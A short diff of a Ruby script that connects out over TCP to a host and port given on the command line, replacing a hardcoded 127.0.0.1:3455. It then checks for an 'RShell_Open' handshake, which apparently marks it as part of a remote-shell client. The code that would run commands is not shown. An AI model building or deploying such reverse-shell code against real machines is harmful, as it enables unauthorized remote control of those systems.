@@ -1,7 +1,7 @@
 require "socket"
 
-host = "127.0.0.1"
-port = 3455
+host = ARGV[0]
+port = ARGV[1].to_i
 host = TCPSocket.open(host, port)
 x = host.gets.chomp
 if x == "RShell_Open"
